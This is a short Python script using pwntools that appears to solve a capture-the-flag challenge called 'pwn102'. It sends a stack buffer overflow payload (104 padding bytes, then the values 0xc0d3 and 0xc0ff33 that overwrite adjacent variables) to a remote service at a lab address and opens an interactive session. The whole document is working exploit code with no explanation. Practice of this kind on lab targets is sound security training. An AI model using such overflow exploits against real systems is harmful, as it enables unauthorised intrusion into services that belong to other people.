#!/usr/bin/env python3

from pwn import *
context.binary = binary = ELF("./pwn102")
context.log_level = "critical"

payload = flat([
b"A"*104,
p32(0xc0d3),
p32(0xc0ff33)
])

p = remote('10.10.202.1', 9002)
p.sendline(payload)

p.interactive()
